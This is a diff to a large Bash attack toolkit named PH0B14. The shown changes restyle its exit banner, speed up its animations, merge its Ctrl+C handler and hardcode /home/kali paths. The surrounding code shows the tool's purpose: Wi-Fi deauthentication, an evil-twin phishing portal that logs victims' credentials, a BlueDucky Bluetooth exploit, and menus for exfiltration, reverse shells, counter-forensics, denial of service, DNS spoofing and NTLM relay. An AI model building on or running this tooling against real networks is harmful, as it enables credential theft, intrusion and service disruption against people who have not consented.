@@ -203,7 +203,7 @@ G_DEAUTH="80x22+640+0"
 G_WEB="80x22+1280+0"
 G_CREDS="100x14+0+380"
 G_VERIFY="100x14+700+380"
-G2SRC="$BASE_DIR/templates/google-2step"
+G2SRC="$BASE_DIR/pages/google-2step"
 
 BASE_DIR="$BASE_DIR"
 HAND_DIR="$BASE_DIR/handshakes"
@@ -375,18 +375,147 @@ ensure_git_tool() {
 }
 
 print_exit_banner(){
+    local cols
+    cols=$(stty size 2>/dev/null | awk '{print $2}')
+    [ -z "$cols" ] && cols=$(tput cols 2>/dev/null)
+    [ -z "$cols" ] && cols=120
+    [ "$cols" -lt 120 ] && cols=120
+
+    local W=$(( cols - 20 ))
+    [ $W -gt 220 ] && W=220
+    [ $W -lt 100 ] && W=100
+    local PAD=$(( (cols - W - 2) / 2 ))
+    [ $PAD -lt 0 ] && PAD=0
+
+    local top="+" lin="+" bot="+" i
+    for ((i=0;i<W;i++)); do top+="="; lin+="-"; bot+="="; done
+    top+="+"; lin+="+"; bot+="+"
+
+    local empty="|"
+    for ((i=0;i<W;i++)); do empty+=" "; done
+    empty+="|"
+
+    _eb_row() {
+        printf "%*s" "$PAD" ""
+        echo -e "${BOLD}${CYAN}$1${NC}"
+    }
+    _eb_center() {
+        local t="$1" c="$2"
+        local len; len=$(_plen "$t")
+        local l=$(( (W - len) / 2 )); [ $l -lt 0 ] && l=0
+        local r=$(( W - len - l )); [ $r -lt 0 ] && r=0
+        printf "%*s" "$PAD" ""
+        printf "${BOLD}${CYAN}|${NC}"
+        printf "%*s" "$l" ""
+        printf "%b%s${NC}" "$c" "$t"
+        printf "%*s" "$r" ""
+        printf "${BOLD}${CYAN}|${NC}
+"
+    }
+    _eb_pair() {
+        local left="$1" right="$2"
+        local sep="     "
+        _eb_center "$left$sep$right" "$3"
+    }
+    # render one row with left content in left half, right content in right half
+    _eb_dual() {
+        local left="$1" right="$2" lc="$3" rc="$4"
+        # W = inner width. Middle sep is " | " (3 chars).
+        # left half = (W-3)/2, right half = W-3-left_half
+        local lh=$(( (W - 3) / 2 ))
+        local rh=$(( W - 3 - lh ))
+        local ll; ll=$(_plen "$left")
+        local rl; rl=$(_plen "$right")
+        # pad each half so content sits center in its own column
+        local lp=$(( (lh - ll) / 2 )); [ $lp -lt 0 ] && lp=0
+        local rp=$(( (rh - rl) / 2 )); [ $rp -lt 0 ] && rp=0
+        local lpad_tail=$(( lh - ll - lp )); [ $lpad_tail -lt 0 ] && lpad_tail=0
+        local rpad_tail=$(( rh - rl - rp )); [ $rpad_tail -lt 0 ] && rpad_tail=0
+
+        printf "%*s" "$PAD" ""
+        printf "${BOLD}${CYAN}|${NC}"
+        printf "%*s" "$lp" ""
+        printf "%b%s${NC}" "$lc" "$left"
+        printf "%*s" "$lpad_tail" ""
+        printf "${BOLD}${CYAN}|${NC} "
+        printf "%*s" "$rp" ""
+        printf "%b%s${NC}" "$rc" "$right"
+        printf "%*s" "$rpad_tail" ""
+        printf " ${BOLD}${CYAN}|${NC}"
+        printf "
+"
+    }
+
     echo ""
-    echo -e "${BOLD}${CYAN}===============================================================${NC}"
-    echo -e "${BOLD}${MAGENTA}                    THANK YOU FOR USING PH0B14${NC}"
-    echo -e "${BOLD}${CYAN}===============================================================${NC}"
-    echo -e "  ${BOLD}${GREEN}Follow / support:${NC}"
-    echo -e "    ${CYAN}Instagram${NC}  ${DIM}->${NC} ${YELLOW}@zeruaep${NC}"
-    echo -e "    ${CYAN}TikTok${NC}     ${DIM}->${NC} ${YELLOW}@zeruaep${NC}"
-    echo -e "    ${CYAN}GitHub${NC}     ${DIM}->${NC} ${YELLOW}zeru-aep${NC}"
-    echo -e "    ${CYAN}Telegram${NC}   ${DIM}->${NC} ${YELLOW}@zeru_aep${NC}"
-    echo ""
-    echo -e "  ${BOLD}${GREEN}Version:${NC} ${YELLOW}v$SCRIPT_VERSION${NC}"
-    echo -e "${BOLD}${CYAN}===============================================================${NC}"
+    _eb_row "$top"
+    _eb_row "$empty"
+
+    # ---- PH0B14 art lines ----
+    local ph0_arr=(
+        "██████╗ ██╗  ██╗ ██████╗ ██████╗  ██╗ ██╗  ██╗"
+        "██╔══██╗██║  ██║██╔═████╗██╔══██╗███║ ██║  ██║"
+        "██████╔╝███████║██║██╔██║██████╔╝╚██║ ███████║"
+        "██╔═══╝ ██╔══██║████╔╝██║██╔══██╗ ██║ ╚════██║"
+        "██║     ██║  ██║╚██████╔╝██████╔╝ ██║      ██║"
+        "╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═════╝  ╚═╝      ╚═╝"
+    )
+    local ph0_count=${#ph0_arr[@]}
+
+    # ---- skull lines (smart trimmed) ----
+    local skull_arr=()
+    if [ -f "$SKULL_FILE" ]; then
+        local skull_lines
+        skull_lines=$(awk '/^###FRAME###$/{exit} {print}' "$SKULL_FILE")
+        local first last
+        first=$(printf '%s
+' "$skull_lines" | grep -n '[^[:space:]]' | head -1 | cut -d: -f1)
+        last=$(printf '%s
+' "$skull_lines" | grep -n '[^[:space:]]' | tail -1 | cut -d: -f1)
+        if [ -n "$first" ] && [ -n "$last" ]; then
+            while IFS= read -r line; do
+                skull_arr+=("$line")
+            done < <(printf '%s
+' "$skull_lines" | sed -n "${first},${last}p")
+        fi
+    fi
+    local skull_count=${#skull_arr[@]}
+
+    # ---- compute vertical centering: pad shorter side with empty rows on top/bottom ----
+    local total_rows=$(( ph0_count > skull_count ? ph0_count : skull_count ))
+    local ph0_top_pad=$(( (total_rows - ph0_count) / 2 ))
+    local skull_top_pad=$(( (total_rows - skull_count) / 2 ))
+
+    local idx
+    for ((idx=0; idx<total_rows; idx++)); do
+        local l="" r=""
+        # PH0B14 side — with top pad
+        local pidx=$(( idx - ph0_top_pad ))
+        if [ $pidx -ge 0 ] && [ $pidx -lt $ph0_count ]; then
+            l="${ph0_arr[$pidx]}"
+        fi
+        # Skull side — with top pad
+        local sidx=$(( idx - skull_top_pad ))
+        if [ $sidx -ge 0 ] && [ $sidx -lt $skull_count ]; then
+            r="${skull_arr[$sidx]}"
+        fi
+        _eb_dual "$l" "$r" "${BOLD}${RED}" "${BOLD}${RED}"
+    done
+
+    _eb_row "$empty"
+    _eb_row "$lin"
+    _eb_row "$empty"
+    _eb_center "◆  THANK YOU FOR USING PH0B14  ◆" "${BOLD}${GREEN}"
+    _eb_center "◆  Version: v$SCRIPT_VERSION  ◆" "${BOLD}${GREEN}"
+    _eb_row "$empty"
+    _eb_row "$lin"
+    _eb_row "$empty"
+    _eb_center "◆  L I N K S  ◆" "${BOLD}${YELLOW}"
+    _eb_row "$empty"
+    _eb_pair "◈  Instagram  ·  @zeruaep" "◈  TikTok     ·  @zeruaep" "${YELLOW}"
+    _eb_row "$empty"
+    _eb_pair "◈  GitHub     ·  PH0B14-toolkit" "◈  Telegram   ·  @zeru_aep" "${YELLOW}"
+    _eb_row "$empty"
+    _eb_row "$bot"
     echo ""
 }
 
@@ -417,14 +546,14 @@ show_intro() {
         done <<< "$art"
     }
 
-    # fast flash: A B A B A B at 0.18s
+    # fast flash: A B A B A B at 0.15s
     local seq=(A B A B A B)
     local f
     for f in "${seq[@]}"; do
         if [ "$f" = "A" ]; then draw_raw "$FRAME_A" "${BOLD}${RED}"; else draw_raw "$FRAME_B" "${BOLD}${RED}"; fi
-        sleep 0.18
+        sleep 0.15
     done
-    sleep 0.1
+    sleep 0.05
     clear
 }
 
@@ -512,7 +641,7 @@ show_intro_main_frame() {
         [ $tail -lt 0 ] && tail=0
         printf "%*s" "$tail" ""
         printf "${BOLD}${CYAN}|${NC}"
-        sleep 0.066
+        sleep 0.044
     done
     printf "\r%*s" "$pad" ""
     printf "${BOLD}${CYAN}|${NC}%*s" "$tpad" ""
@@ -566,76 +695,6 @@ NR>1 && NF>=14 {
 AWKEOF
         chmod 644 "$SCAN_PARSER"
     fi
-}
-on_interrupt() {
-    local counter="/tmp/phobia_int_count"
-    local stamp="/tmp/phobia_int_time"
-    local now
-    now=$(date +%s)
-    local last=0
-    local count=0
-    [ -f "$stamp" ] && last=$(cat "$stamp" 2>/dev/null)
-    [ -f "$counter" ] && count=$(cat "$counter" 2>/dev/null)
-    if [ $(( now - last )) -gt 3 ]; then
-        count=0
-    fi
-    count=$((count + 1))
-    echo "$now" > "$stamp"
-    echo "$count" > "$counter"
-
-    if [ "$count" -ge 2 ]; then
-        echo ""
-        echo -e "${RED}[!] Quitting.${NC}"
-        rm -f "$counter" "$stamp"
-        pkill -9 -f xterm 2>/dev/null
-        pkill -9 -f hostapd 2>/dev/null
-        pkill -9 -f dnsmasq 2>/dev/null
-        pkill -9 -f "evil-server.py" 2>/dev/null
-    pkill -9 -f https_probe.py 2>/dev/null
-        pkill -9 -f aireplay-ng 2>/dev/null
-        pkill -9 -f airodump-ng 2>/dev/null
-        pkill -9 -f mdk4 2>/dev/null
-        pkill -9 -f arpspoof 2>/dev/null
-        sleep 1
-        if ip link show "$MONITOR" >/dev/null 2>&1; then ip link set "$MONITOR" down >/dev/null 2>&1; fi
-        if iw dev "$MONITOR" info >/dev/null 2>&1; then iw dev "$MONITOR" del >/dev/null 2>&1; fi
-        if ip link show "$INTERFACE" >/dev/null 2>&1; then
-            ip link set "$INTERFACE" down >/dev/null 2>&1
-            iw dev "$INTERFACE" set type managed >/dev/null 2>&1
-            ip link set "$INTERFACE" up >/dev/null 2>&1
-            ip addr flush dev "$INTERFACE" >/dev/null 2>&1
-        fi
-        timeout 5 dhclient "$INTERFACE" >/dev/null 2>&1 &
-        timeout 10 systemctl restart NetworkManager >/dev/null 2>&1 &
-        echo -e "${GREEN}[+] Cleaned up.${NC}"
-        exit 0
-    fi
-
-    echo ""
-    echo -e "${YELLOW}[*] Returning to menu...${NC}"
-    echo -e "${DIM}    Press Ctrl+C again within 3s to QUIT.${NC}"
-    pkill -9 -f xterm 2>/dev/null
-    sleep 1
-    pkill -9 -f hostapd 2>/dev/null
-    pkill -9 -f dnsmasq 2>/dev/null
-    pkill -9 -f "evil-server.py" 2>/dev/null
-    pkill -9 -f https_probe.py 2>/dev/null
-    pkill -9 -f aireplay-ng 2>/dev/null
-    pkill -9 -f airodump-ng 2>/dev/null
-    pkill -9 -f mdk4 2>/dev/null
-    pkill -9 -f arpspoof 2>/dev/null
-    sleep 1
-    if ip link show "$MONITOR" >/dev/null 2>&1; then ip link set "$MONITOR" down >/dev/null 2>&1; fi
-    if iw dev "$MONITOR" info >/dev/null 2>&1; then iw dev "$MONITOR" del >/dev/null 2>&1; fi
-    if ip link show "$INTERFACE" >/dev/null 2>&1; then
-        ip link set "$INTERFACE" down >/dev/null 2>&1
-        iw dev "$INTERFACE" set type managed >/dev/null 2>&1
-        ip link set "$INTERFACE" up >/dev/null 2>&1
-        ip addr flush dev "$INTERFACE" >/dev/null 2>&1
-    fi
-    timeout 5 dhclient "$INTERFACE" >/dev/null 2>&1 &
-    timeout 10 systemctl restart NetworkManager >/dev/null 2>&1 &
-    BACK_TO_MENU=1
 }
 
 kill_stuck() {
@@ -1449,7 +1508,7 @@ PYEOF
             bash -c "ip link set $MONITOR_ACTUAL down 2>/dev/null; iw dev $MONITOR_ACTUAL set type monitor 2>/dev/null; iw dev $MONITOR_ACTUAL set channel $TARGET_CHANNEL 2>/dev/null; ip link set $MONITOR_ACTUAL up 2>/dev/null; sleep 1; aireplay-ng --ignore-negative-one --deauth 0 -a $TARGET_BSSID $MONITOR_ACTUAL; echo; echo '>>> stopped'; read"
     fi
 
-    trap on_interrupt INT
+    trap phobia_interrupt INT
     echo ""
     echo -e "${BOLD}${GREEN}===================================================${NC}"
     echo -e "${BOLD}${GREEN} PHISH RUNNING -- SSID: $TARGET_ESSID${NC}"
@@ -1861,7 +1920,7 @@ PYEOF
     launch_xterm -bg black -fg '#00ff88' -title "VERIFIED" -geometry $G_VERIFY -e bash -c "tail -f /var/www/html/verified_creds.txt"
 
     rm -f /tmp/evil_success
-    trap on_interrupt INT
+    trap phobia_interrupt INT
     echo ""
     echo -e "${BOLD}${GREEN}========= FIRMWARE RUNNING =========${NC}"
     echo -e "${BOLD}${BLUE} Internet: $DO_INTERNET${NC}"
@@ -2241,13 +2300,13 @@ bt_adv_spam() {
 bt_blueducky() {
     print_banner
     echo -e "${BOLD}${MAGENTA}========= BLUEDUCKY (CVE-2023-45866) =========${NC}"
-    if [ ! -d "$HOME/BlueDucky" ] && [ ! -d $HOME/BlueDucky ]; then
+    if [ ! -d "/home/kali/BlueDucky" ] && [ ! -d /home/kali/BlueDucky ]; then
         echo -e "${RED}[!] BlueDucky not installed.${NC}"
         echo -e "${DIM}    git clone https://github.com/eirkkk/BlueDucky-In-NetHunter ~/BlueDucky${NC}"
         pause; return
     fi
-    local dir="$HOME/BlueDucky"
-    [ -d $HOME/BlueDucky ] && dir="$HOME/BlueDucky"
+    local dir="/home/kali/BlueDucky"
+    [ -d /home/kali/BlueDucky ] && dir="/home/kali/BlueDucky"
     echo -e "${YELLOW}[!] Requires CSR 4.0 Bluetooth adapter.${NC}"
     echo -e "${YELLOW}[!] Realtek RTL8761/IMC Networks will fail.${NC}"
     echo ""
@@ -2265,14 +2324,14 @@ bt_blueducky() {
 bt_bluetoolkit() {
     print_banner
     echo -e "${BOLD}${MAGENTA}========= BLUETOOLKIT =========${NC}"
-    if [ ! -d $HOME/BlueToolkit ] && [ ! -d "$HOME/BlueToolkit" ]; then
+    if [ ! -d /home/kali/BlueToolkit ] && [ ! -d "/home/kali/BlueToolkit" ]; then
         echo -e "${RED}[!] BlueToolkit not installed.${NC}"
         echo -e "${DIM}    git clone https://github.com/sgxgsx/BlueToolkit ~/BlueToolkit${NC}"
         pause; return
     fi
-    local dir="$HOME/BlueToolkit"
-    [ -d $HOME/BlueToolkit ] && dir="$HOME/BlueToolkit"
-    [ -d "$HOME/BlueToolkit" ] && dir="$HOME/BlueToolkit"
+    local dir="/home/kali/BlueToolkit"
+    [ -d /home/kali/BlueToolkit ] && dir="/home/kali/BlueToolkit"
+    [ -d "/home/kali/BlueToolkit" ] && dir="/home/kali/BlueToolkit"
     cd "$dir" || { pause; return; }
     echo -e "${CYAN}[*] 1) List exploits  2) Recon target  3) Check connectivity${NC}"
     read -p "$(echo -e ${YELLOW}'Choice: '${NC})" BT_CH
@@ -2289,7 +2348,7 @@ bt_l2flood_dir() {
     print_banner
     echo -e "${BOLD}${RED}========= L2FLOOD =========${NC}"
 
-    local dir="$HOME/l2flood"
+    local dir="/home/kali/l2flood"
 
     if [ ! -d "$dir" ]; then
         echo -e "${YELLOW}[!] l2flood not found. Installing...${NC}"
@@ -2457,7 +2516,7 @@ web_is_live() {
 }
 
 menu_web() {
-    trap on_interrupt INT
+    trap phobia_interrupt INT
     while true; do
         print_banner
         echo -e "${BOLD}${WHITE}=========== WEBSITE / DoS ===========${NC}"
@@ -3551,8 +3610,8 @@ ensure_ad_tools() {
         echo -e "${YELLOW}[!] kerbrute not installed.${NC}"
         read -p "$(echo -e ${YELLOW}'Clone kerbrute now? [y/N]: '${NC})" DO
         if [ "$DO" = "y" ] || [ "$DO" = "Y" ]; then
-            [ -d $HOME/kerbrute ] || git clone --depth 1 https://github.com/ropnop/kerbrute $HOME/kerbrute 2>&1 | tail -3
-            [ -f $HOME/kerbrute/kerbrute_linux_amd64 ] && sudo ln -sf $HOME/kerbrute/kerbrute_linux_amd64 /usr/local/bin/kerbrute
+            [ -d /home/kali/kerbrute ] || git clone --depth 1 https://github.com/ropnop/kerbrute /home/kali/kerbrute 2>&1 | tail -3
+            [ -f /home/kali/kerbrute/kerbrute_linux_amd64 ] && sudo ln -sf /home/kali/kerbrute/kerbrute_linux_amd64 /usr/local/bin/kerbrute
         fi
     fi
 
@@ -4094,7 +4153,7 @@ wireless_karma() {
 
     # eaphammer is NOT in apt — it must be git-cloned. Handle that here.
     if ! command -v eaphammer >/dev/null 2>&1; then
-        local ehdir="$HOME/eaphammer"
+        local ehdir="/home/kali/eaphammer"
         if [ ! -d "$ehdir" ]; then
             echo -e "${YELLOW}[!] eaphammer not installed.${NC}"
             echo -e "${DIM}    Repo: github.com/s0lst1c3/eaphammer${NC}"
@@ -5292,7 +5351,7 @@ pyphisher_launch() {
     echo -e "${DIM}    Repo: github.com/An0nUD4Y/blackeye${NC}"
     echo ""
 
-    local dir="$HOME/blackeye"
+    local dir="/home/kali/blackeye"
 
     if [ ! -d "$dir" ]; then
         echo -e "${YELLOW}[!] BlackEye not installed at $dir${NC}"
@@ -5403,7 +5462,7 @@ osint_whatsmyname() {
 osint_sherlock() {
     print_banner
     echo -e "${BOLD}${CYAN}========= SHERLOCK ========="
-    local dir="$HOME/sherlock"
+    local dir="/home/kali/sherlock"
     if [ ! -d "$dir" ]; then
         echo -e "${YELLOW}[!] Sherlock not installed at $dir${NC}"
         read -p "$(echo -e ${YELLOW}'Install now? [y/N]: '${NC})" DO
@@ -5541,7 +5600,7 @@ osint_status() {
     echo ""
 
     local entries=(
-        "sherlock|git|https://github.com/sherlock-project/sherlock|$HOME/sherlock"
+        "sherlock|git|https://github.com/sherlock-project/sherlock|/home/kali/sherlock"
         "maigret|pip|maigret|"
         "whois|apt|whois|"
         "dig|apt|bind9-dnsutils|"
@@ -5604,7 +5663,7 @@ osint_status() {
 
 osint_install_sherlock() {
     print_banner
-    local dir="$HOME/sherlock"
+    local dir="/home/kali/sherlock"
     if [ -d "$dir" ]; then
         echo -e "${GREEN}[+] Sherlock already installed at $dir${NC}"
         pause; return
@@ -5845,7 +5904,9 @@ phobia_interrupt() {
     local now last
     now=$(date +%s); last=0
     [ -f "$PHOBIA_INT_STAMP" ] && last=$(cat "$PHOBIA_INT_STAMP" 2>/dev/null)
-    if [ $(( now - last )) -le $PHOBIA_INT_WINDOW ]; then
+
+    if [ $(( now - last )) -le 3 ] && [ "$last" != "0" ]; then
+        # second press → QUIT
         rm -f "$PHOBIA_INT_STAMP"
         echo ""
         echo -e "${RED}[!] Double Ctrl+C — quitting.${NC}"
@@ -5853,7 +5914,7 @@ phobia_interrupt() {
         pkill -9 -f hostapd 2>/dev/null
         pkill -9 -f dnsmasq 2>/dev/null
         pkill -9 -f "evil-server.py" 2>/dev/null
-    pkill -9 -f https_probe.py 2>/dev/null
+        pkill -9 -f https_probe.py 2>/dev/null
         pkill -9 -f aireplay-ng 2>/dev/null
         pkill -9 -f airodump-ng 2>/dev/null
         pkill -9 -f mdk4 2>/dev/null
@@ -5861,6 +5922,9 @@ phobia_interrupt() {
         pkill -9 -f reaver 2>/dev/null
         pkill -9 -f wash 2>/dev/null
         pkill -9 -f hcxdumptool 2>/dev/null
+        pkill -9 -f "impacket-ntlmrelayx" 2>/dev/null
+        pkill -9 -f "Responder.py" 2>/dev/null
+        pkill -9 -f "phobia_dnspage.py" 2>/dev/null
         sleep 1
         iptables -t nat -D POSTROUTING -o eth0 -j MASQUERADE 2>/dev/null
         iptables -D FORWARD -i wlan0 -o eth0 -j ACCEPT 2>/dev/null
@@ -5879,10 +5943,12 @@ phobia_interrupt() {
         print_exit_banner
         exit 0
     fi
+
+    # first press → back to menu
     echo "$now" > "$PHOBIA_INT_STAMP"
     echo ""
     echo -e "${YELLOW}[*] Ctrl+C — back to menu.${NC}"
-    echo -e "${DIM}    (again within ${PHOBIA_INT_WINDOW}s = QUIT)${NC}"
+    echo -e "${DIM}    (again within 3s = QUIT)${NC}"
     pkill -9 -f xterm 2>/dev/null
     pkill -9 -f aireplay-ng 2>/dev/null
     pkill -9 -f airodump-ng 2>/dev/null
@@ -5997,7 +6063,7 @@ addon_bt_hci_list() {
 
 # ---------- 3. WEBSITE / DoS ----------
 menu_web() {
-    trap on_interrupt INT
+    trap phobia_interrupt INT
     while true; do
         print_banner
         menu_header "W E B S I T E   /   D o S"
@@ -6151,7 +6217,7 @@ menu_row() {
 # ---- 8. Tunnels ----
 # ---- 11. IP Changer ----
 menu_ip_changer() {
-    trap on_interrupt INT
+    trap phobia_interrupt INT
     while true; do
         print_banner
         menu_header "I P   C H A N G E R   ( T O R )"
@@ -6180,7 +6246,7 @@ menu_ip_changer() {
 
 # ---- 15. OSINT ----
 osint_menu() {
-    trap on_interrupt INT
+    trap phobia_interrupt INT
     while true; do
         print_banner
         menu_header "O S I N T   L O O K U P S"
@@ -6235,7 +6301,7 @@ osint_menu() {
 
 # ---- 16. MSF ----
 msf_scan_exploit() {
-    trap on_interrupt INT
+    trap phobia_interrupt INT
     while true; do
         print_banner
         menu_header "M E T A S P L O I T   /   P O S T - E X P L O I T"
@@ -6260,7 +6326,7 @@ msf_scan_exploit() {
 
 # ---- 17. Multi-target controller ----
 addon_multi_controller() {
-    trap on_interrupt INT
+    trap phobia_interrupt INT
     while true; do
         print_banner
         menu_header "M U L T I - T A R G E T   C O N T R O L L E R"
@@ -6322,7 +6388,7 @@ addon_multi_controller() {
 
 # ---- SOCIAL (from OSINT 13) ----
 addon_social() {
-    trap on_interrupt INT
+    trap phobia_interrupt INT
     while true; do
         print_banner
         menu_header "S O C I A L   E N G I N E E R I N G"
@@ -6453,7 +6519,7 @@ addon_obfuscate() {
 }
 
 addon_wpa3_advanced() {
-    trap on_interrupt INT
+    trap phobia_interrupt INT
     while true; do
         print_banner
         menu_header "W P A 3   A D V A N C E D"
@@ -6481,7 +6547,7 @@ addon_wpa3_advanced() {
 }
 
 addon_cellular() {
-    trap on_interrupt INT
+    trap phobia_interrupt INT
     while true; do
         print_banner
         menu_header "C E L L U L A R   /   S D R"
@@ -6509,7 +6575,7 @@ addon_cellular() {
 }
 
 addon_physical() {
-    trap on_interrupt INT
+    trap phobia_interrupt INT
     while true; do
         print_banner
         menu_header "P H Y S I C A L   A C C E S S"
@@ -6558,7 +6624,7 @@ BB
 }
 
 addon_anonymity() {
-    trap on_interrupt INT
+    trap phobia_interrupt INT
     while true; do
         print_banner
         menu_header "A N O N Y M I T Y   T O O L S"
@@ -6586,7 +6652,7 @@ addon_anonymity() {
 }
 
 addon_exfil() {
-    trap on_interrupt INT
+    trap phobia_interrupt INT
     while true; do
         print_banner
         menu_header "E X F I L T R A T I O N"
@@ -6660,7 +6726,7 @@ PYEOF
 }
 
 addon_fuzz() {
-    trap on_interrupt INT
+    trap phobia_interrupt INT
     while true; do
         print_banner
         menu_header "F U Z Z I N G"
@@ -6692,7 +6758,7 @@ addon_fuzz() {
 }
 
 addon_hardware() {
-    trap on_interrupt INT
+    trap phobia_interrupt INT
     while true; do
         print_banner
         menu_header "H A R D W A R E   I N T E G R A T I O N"
@@ -6726,7 +6792,7 @@ addon_hardware() {
 }
 
 addon_counter_forensics() {
-    trap on_interrupt INT
+    trap phobia_interrupt INT
     while true; do
         print_banner
         menu_header "C O U N T E R - F O R E N S I C S"
@@ -6754,7 +6820,7 @@ addon_counter_forensics() {
 
 # ---- Top-level submenus ----
 menu_wpa3() {
-    trap on_interrupt INT
+    trap phobia_interrupt INT
     while true; do
         print_banner
         menu_header "W P A 3   A T T A C K S"
@@ -6777,7 +6843,7 @@ menu_wpa3() {
 }
 
 menu_enterprise() {
-    trap on_interrupt INT
+    trap phobia_interrupt INT
     while true; do
         print_banner
         menu_header "E N T E R P R I S E"
@@ -6798,7 +6864,7 @@ menu_enterprise() {
 }
 
 menu_handshake() {
-    trap on_interrupt INT
+    trap phobia_interrupt INT
     while true; do
         print_banner
         menu_header "H A N D S H A K E   /   P M K I D"
@@ -6825,7 +6891,7 @@ menu_handshake() {
 }
 
 menu_offline_wep_wps() {
-    trap on_interrupt INT
+    trap phobia_interrupt INT
     while true; do
         print_banner
         menu_header "O F F L I N E   /   W E P   /   W P S"
@@ -6866,7 +6932,7 @@ menu_offline_wep_wps() {
 }
 
 menu_dos() {
-    trap on_interrupt INT
+    trap phobia_interrupt INT
     while true; do
         print_banner
         menu_header "D E N I A L   O F   S E R V I C E"
@@ -6908,7 +6974,7 @@ menu_dos() {
 }
 
 menu_web_scan() {
-    trap on_interrupt INT
+    trap phobia_interrupt INT
     while true; do
         print_banner
         menu_header "W E B   S C A N   &   E X P L O I T"
@@ -6938,7 +7004,7 @@ menu_web_scan() {
 }
 
 menu_web_dos() {
-    trap on_interrupt INT
+    trap phobia_interrupt INT
     while true; do
         print_banner
         menu_header "D E N I A L   O F   S E R V I C E"
@@ -6967,7 +7033,7 @@ menu_web_dos() {
 }
 
 menu_ad() {
-    trap on_interrupt INT
+    trap phobia_interrupt INT
     while true; do
         print_banner
         menu_header "A C T I V E   D I R E C T O R Y"
@@ -7001,7 +7067,7 @@ menu_ad() {
 }
 
 menu_internal() {
-    trap on_interrupt INT
+    trap phobia_interrupt INT
     while true; do
         print_banner
         menu_header "I N T E R N A L   S E R V I C E S"
@@ -7029,7 +7095,7 @@ menu_internal() {
 }
 
 menu_cloud() {
-    trap on_interrupt INT
+    trap phobia_interrupt INT
     while true; do
         print_banner
         menu_header "C L O U D   /   C O N T A I N E R S"
@@ -7055,7 +7121,7 @@ menu_cloud() {
 }
 
 menu_live_attacks() {
-    trap on_interrupt INT
+    trap phobia_interrupt INT
     while true; do
         print_banner
         menu_header "L I V E   A T T A C K S"
@@ -7100,7 +7166,7 @@ menu_live_attacks() {
 }
 
 tunnel_menu() {
-    trap on_interrupt INT
+    trap phobia_interrupt INT
     while true; do
         print_banner
         menu_header "T U N N E L   S E T U P"
@@ -7126,7 +7192,7 @@ tunnel_menu() {
 }
 
 custom_page_menu() {
-    trap on_interrupt INT
+    trap phobia_interrupt INT
     while true; do
         print_banner
         menu_header "C U S T O M   P A G E   L O A D E R"
@@ -7221,7 +7287,7 @@ tunnel_reverse_shell() {
 
 # the obfuscator — reads the last shell, applies an encoding, saves
 tunnel_shell_obfuscate() {
-    trap on_interrupt INT
+    trap phobia_interrupt INT
     local SHELL_LOG="$LOGS_DIR/last_shells.txt"
     while true; do
         print_banner
@@ -7414,7 +7480,7 @@ _silent() {
 # ===============================================================
 _appleble_find_dir() {
     local dir=""
-    for d in $HOME/AppleBLE "$HOME/AppleBLE" "$BASE_DIR/AppleBLE"; do
+    for d in /home/kali/AppleBLE "/home/kali/AppleBLE" "$BASE_DIR/AppleBLE"; do
         [ -d "$d" ] && dir="$d" && break
     done
     echo "$dir"
@@ -7428,11 +7494,11 @@ _appleble_ensure() {
         phb_row "  AppleBLE not found." "${BOLD}${YELLOW}"
         phb_row "  Clone ThemeHackers/AppleBLE now?" "${DIM}${GREY}"
         phb_div
-        read -p "$(echo -e ${YELLOW}'Clone to $HOME/AppleBLE? [Y/n]: '${NC})" DO
+        read -p "$(echo -e ${YELLOW}'Clone to /home/kali/AppleBLE? [Y/n]: '${NC})" DO
         DO="${DO:-y}"
         if [ "$DO" = "y" ] || [ "$DO" = "Y" ]; then
-            git clone --depth 1 https://github.com/ThemeHackers/AppleBLE $HOME/AppleBLE >/dev/null 2>&1
-            dir="$HOME/AppleBLE"
+            git clone --depth 1 https://github.com/ThemeHackers/AppleBLE /home/kali/AppleBLE >/dev/null 2>&1
+            dir="/home/kali/AppleBLE"
             if [ -f "$dir/requirements.txt" ]; then
                 ( cd "$dir" && pip3 install --break-system-packages -r requirements.txt >/dev/null 2>&1 )
             fi
@@ -7458,7 +7524,7 @@ _appleble_live() {
 # APPLEBLE menu — adds [7] Refresh
 # ===============================================================
 bt_appleble() {
-    trap on_interrupt INT
+    trap phobia_interrupt INT
 
     local dir; dir=$(_appleble_ensure)
     if [ -z "$dir" ] || [ ! -d "$dir" ]; then
@@ -7557,7 +7623,7 @@ bt_appleble() {
 # BLUETOOTH MENU — [17] Refresh inside
 # ===============================================================
 menu_bluetooth() {
-    trap on_interrupt INT
+    trap phobia_interrupt INT
     while true; do
         print_banner
         menu_header "B L U E T O O T H   A T T A C K S"
@@ -7646,7 +7712,7 @@ _bsilent() {
 }
 
 bt_refresh() {
-    trap on_interrupt INT
+    trap phobia_interrupt INT
     print_banner
     menu_header "B L U E T O O T H   R E F R E S H"
 
@@ -8049,7 +8115,7 @@ dnsm_live_log() {
 # DNS SPOOF — menu
 # ===============================================================
 menu_standalone_dns() {
-    trap on_interrupt INT
+    trap phobia_interrupt INT
     while true; do
         print_banner
         menu_header "S T A N D A L O N E   D N S   S P O O F"
@@ -8431,7 +8497,7 @@ dnsm_stop() {
 
     echo -e "${GREEN}[+] Stopped. Network restored.${NC}"
     trap - INT
-    trap on_interrupt INT
+    trap phobia_interrupt INT
 }
 
 # ===============================================================
@@ -8704,7 +8770,7 @@ _vault_query() {
 }
 
 _vault_menu() {
-    trap on_interrupt INT
+    trap phobia_interrupt INT
     while true; do
         print_banner
         menu_header "C R E D   V A U L T"
@@ -9489,7 +9555,7 @@ _portal_drop_set_mode() {
 }
 
 _portal_drop_config() {
-    trap on_interrupt INT
+    trap phobia_interrupt INT
     while true; do
         print_banner
         menu_header "P O R T A L   P A Y L O A D   D R O P"
@@ -9637,7 +9703,7 @@ _sched_list() {
 }
 
 _sched_menu() {
-    trap on_interrupt INT
+    trap phobia_interrupt INT
     while true; do
         print_banner
         menu_header "S C H E D U L E R"
@@ -9865,7 +9931,7 @@ HTMLEOF
 }
 
 _report_menu() {
-    trap on_interrupt INT
+    trap phobia_interrupt INT
     while true; do
         print_banner
         menu_header "R E P O R T I N G"
@@ -9910,7 +9976,7 @@ _report_menu() {
 # TUNNELS MENU — with persistence + improved encoder
 # ===============================================================
 menu_tunnel() {
-    trap on_interrupt INT
+    trap phobia_interrupt INT
     while true; do
         print_banner
         menu_header "T U N N E L S   /   E X F I L"
@@ -10280,7 +10346,7 @@ _rdhcp_devices() {
 }
 
 _rdhcp_menu() {
-    trap on_interrupt INT
+    trap phobia_interrupt INT
     while true; do
         print_banner
         menu_header "R O G U E   D H C P"
@@ -10407,7 +10473,7 @@ _mitm_analyze() {
 # WIRELESS EXTENDED MENU — Rogue DHCP added
